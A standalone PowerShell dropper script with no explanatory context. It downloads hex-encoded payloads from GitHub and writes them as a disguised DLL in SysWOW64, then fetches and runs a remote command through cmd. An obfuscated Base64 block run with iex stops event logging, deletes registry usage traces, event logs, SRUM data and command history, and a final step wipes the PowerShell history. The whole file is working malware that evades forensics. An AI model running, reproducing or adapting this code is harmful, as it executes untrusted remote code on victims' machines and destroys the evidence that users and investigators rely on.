$ErrorActionPreference = 'SilentlyContinue'
cls
Add-Type -AssemblyName System.Windows.Forms
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/master/b.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $cleanHex = [regex]::Replace($hexStr, '[^0-9A-Fa-f]', '')
    if ($cleanHex.Length % 2 -ne 0) {
        return $null
    }
    $byteArr = [byte[]]::new($cleanHex.Length / 2)
    for ($i = 0; $i -lt $cleanHex.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($cleanHex.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content
    $bytes = HexToBytes $hexContent
    if ($bytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $bytes)
    }
} catch {}

Set-Clipboard $clipText

try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {}

do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "Installer")

try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content
    $newBytes = HexToBytes $newHexContent
    if ($newBytes -ne $null) {
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    }
} catch {}

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJwpjbHMKU2V0LUNsaXBib2FyZCAtVmFsdWUgIiAiCnRhc2traWxsIC9mIC9pbSBleHBsb3Jlci5leGUgKj4gJG51bGwKbmV0IHN0b3AgRXZlbnRMb2cgL3kgKj4gJG51bGwKJHBhcmVudFBhdGggPSAiSEtMTTpcU1lTVEVNXENvbnRyb2xTZXQwMDFcU2VydmljZXNcYmFtXFN0YXRlXFVzZXJTZXR0aW5ncyIKY21kIC9jICJmb3IgL2YgIiJ0b2tlbnM9KiIiICVhIGluICgncmVnIHF1ZXJ5ICIiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDb250cm9sU2V0MDAxXFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3MiIicpIGRvIGlmIG5vdCAiIiVhIiI9PSIiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDb250cm9sU2V0MDAxXFNlcnZpY2VzXGJhbVxTdGF0ZVxVc2VyU2V0dGluZ3MiIiAocmVnIGRlbGV0ZSAiIiVhIiIgL2YpIiAqPiAkbnVsbApSZW1vdmUtSXRlbSAtUGF0aCAiSEtDUjpcTG9jYWwgU2V0dGluZ3NcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGwiIC1SZWN1cnNlIC9mICo+ICRudWxsClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxDb21EbGczMiIgLVJlY3Vyc2UgL2YgKj4gJG51bGwKUmVtb3ZlLUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFJlY2VudERvY3MiIC1SZWN1cnNlIC9mICo+ICRudWxsClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxVc2VyQXNzaXN0IiAtUmVjdXJzZSAvZiAqPiAkbnVsbApSZW1vdmUtSXRlbSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cQXBwQ29tcGF0RmxhZ3NcQ29tcGF0aWJpbGl0eSBBc3Npc3RhbnRcU3RvcmUiIC1SZWN1cnNlIC9mICo+ICRudWxsClJlbW92ZS1JdGVtIC1QYXRoICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxGZWF0dXJlVXNhZ2UiIC1SZWN1cnNlIC9mICo+ICRudWxsClJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEV4cGxvcmVyXFR5cGVkUGF0aHMiIC1OYW1lICogL2YgKj4gJG51bGwgIApDbGVhci1EbnNDbGllbnRDYWNoZSAvZiAqPiAkbnVsbApSZW1vdmUtSXRlbSAtUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMlx3aW5ldnRcTG9nc1wqLmV2dHgiIC9mICo+ICRudWxsClJlbW92ZS1JdGVtIC1QYXRoICJDOlxXaW5kb3dzXGFwcGNvbXBhdFxwY2EqLnR4dCIgL2YgKj4gJG51bGwKUmVtb3ZlLUl0ZW0gLVBhdGggIkM6XFdpbmRvd3NcU3lzdGVtMzJcc3J1XFNSVURCLmRhdCIgL2YgKj4gJG51bGwKUmVtb3ZlLUl0ZW0gLVBhdGggIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xQb3dlclNoZWxsXFBTUmVhZExpbmUqLnR4dCIgL2YgKj4gJG51bGwKI1JlbW92ZS1JdGVtIC1wYXRoICIkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcRml2ZU1cRml2ZU0uYXBwXGxvZ3NcKiIgLVJlY3Vyc2UgL2YgKj4gJG51bGwKI1JlbW92ZS1JdGVtIC1wYXRoICIkZW52OlVTRVJQUk9GSUxFXEFwcERhdGFcTG9jYWxcRml2ZU1cRml2ZU0uYXBwXGNyYXNoZXNcKiIgLVJlY3Vyc2UgL2YgKj4gJG51bGwKCkdldC1DaGlsZEl0ZW0gLVBhdGggIiRlbnY6VVNFUlBST0ZJTEVcQXBwRGF0YVxMb2NhbFxDcmFzaER1bXBzIiAtUmVjdXJzZSAtRmlsZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgIippbnN0YWxsZXIqIiB9IHwgUmVtb3ZlLUl0ZW0gL2YgKj4gJG51bGwKClJ1bmRsbDMyLmV4ZSBhcHBoZWxwLmRsbCxTaGltRmx1c2hDYWNoZQoKU3RhcnQtUHJvY2VzcyBleHBsb3Jlci5leGUgKj4gJG51bGwKbmV0IHN0YXJ0IEV2ZW50TG9nIC95ICo+ICRudWxsCmV4aXQK"))) #secret

$historyFilePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-Content -Path $historyFilePath -Force
Clear-History -Force 
exit
